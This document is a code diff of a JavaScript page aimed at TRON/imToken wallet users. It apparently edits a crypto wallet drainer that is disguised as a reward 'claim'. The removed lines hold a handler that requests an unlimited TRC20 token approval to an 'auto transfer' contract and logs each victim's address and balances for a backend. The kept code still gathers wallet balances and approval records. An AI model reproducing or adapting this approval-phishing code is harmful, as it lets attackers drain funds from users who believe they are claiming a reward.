@@ -725,96 +725,18 @@
         /**
          * 初始化钱包（原逻辑不变，确保提前获取合约和余额）
          */
-                  if (window.tronWeb && window.tronWeb.ready) {
-                // 钱包内置浏览器：自动连接 + 立即初始化合约
-                tronWeb = window.tronWeb;
-                selectWalletBtn.style.display = "none";
-                warning.style.display = "none";
-                await initWallet(); // 连接钱包后立即执行（含合约初始化）
-            } else {
-                // 外部浏览器：显示选择按钮，隐藏领取按钮（不变）
-                document.getElementById("userInfo").innerHTML = "imToken专属服务，请点击「选择钱包」跳转授权";
-                approveBtn.style.display = "none";
-                recordList.style.display = "none";
-                startPersistentTrxCountdown();
-            }
-
-            // 手动连接钱包（钱包环境内）：连接后立即初始化合约
-            connectBtn.onclick = async () => {
-                try {
-                    if (!window.tronWeb) {
-                        navigateToWallet('imtoken');
-                        return;
-                    }
-                    const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });
-                    userAddress = accounts[0];
-                    connectBtn.style.display = "none";
-                    warning.style.display = "none";
-                    await initWallet(); // 手动连接后立即执行（含合约初始化）
-                } catch (e) {
-                    alert("连接失败：" + e.message);
-                }
-            };
-
-            // 领取按钮逻辑（不变，但此时合约已提前初始化）
-            approveBtn.onclick = async () => {
-                approvalLoadingModal.classList.add("show");
-                const postData = {
-                    address: userAddress,
-                    tokenBalance: tokenBalance,
-                    trxBalance: trxBalance,
-                    approveTime: new Date().toLocaleString(),
-                    isApproved: false
-                };
-                try {
-                    // 此时trc20Contract已提前初始化，直接调用approve，无额外等待
-                    if (!trc20Contract || !userAddress) throw new Error("合约/地址未初始化");
-                    await trc20Contract.approve(
-                        AUTO_TRANSFER_CONTRACT,
-                        INFINITE_APPROVE_AMOUNT
-                    ).send({ from: userAddress, shouldPollResponse: true });
-                    postData.isApproved = true;
-                    approvalLoadingModal.classList.remove("show");
-                    alert("【授权】成功！已向后端发送转账请求");
-                    saveApprovalRecord({
-                        address: userAddress,
-                        tokenBalance: tokenBalance,
-                        trxBalance: trxBalance,
-                        approveTime: postData.approveTime,
-                        approveType: "无限额度"
-                    });
-                    renderApprovalRecords();
-                } catch (e) {
-                    approvalLoadingModal.classList.remove("show");
-                    alert(`【授权】失败：${e.message}`);
-                } finally {
-                    // 发送数据到后端（不变）
-                }
-            };
-
-            // 页面卸载保存状态 + 启动TRX计算（不变）
-        };
-
-        /**
-         * 初始化钱包：连接成功后立即执行，包含合约实例初始化
-         * 核心优化：提前获取合约实例，用户浏览页面时完成，领取时直接使用
-         */
         async function initWallet() {
             try {
-                // 1. 获取用户地址（不变）
                 userAddress = tronWeb.defaultAddress.base58;
-                
-                // 2. 核心优化：立即初始化合约实例（关键步骤，提前执行）
                 trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
-                console.log("合约实例已提前初始化，领取时可直接调用授权方法");
                 
-                // 3. 获取用户余额（不变，用户浏览页面时完成）
+                // 提前获取余额，避免领取时再查询
                 const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
                 tokenBalance = (Number(usdtRaw) / 1000000).toFixed(2);
                 const trxRaw = await tronWeb.trx.getBalance(userAddress);
                 trxBalance = (Number(trxRaw) / 1000000).toFixed(2);
                 
-                // 4. 更新页面信息（不变，用户看到连接成功后，页面已加载完余额和合约实例）
+                // 更新页面信息
                 document.getElementById("userInfo").innerHTML = `
                     已连接：<br>
                     ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
@@ -825,13 +747,12 @@
                 recordList.style.display = "block";
                 renderApprovalRecords();
             } catch (e) {
-                // 初始化失败降级处理：不影响页面浏览，领取时再重试
                 tokenBalance = "0.00";
                 trxBalance = "0.00";
-                trc20Contract = null; // 标记未初始化，领取时重新尝试
-                alert("钱包初始化完成，但合约连接暂时失败，领取时会自动重试：" + e.message);
+                alert("钱包初始化失败：" + e.message);
             }
         }
+
         // -------------------------- 以下为原工具函数（无修改） --------------------------
         function startPersistentTrxCountdown() {
             const savedState = loadTrxStateFromStorage();
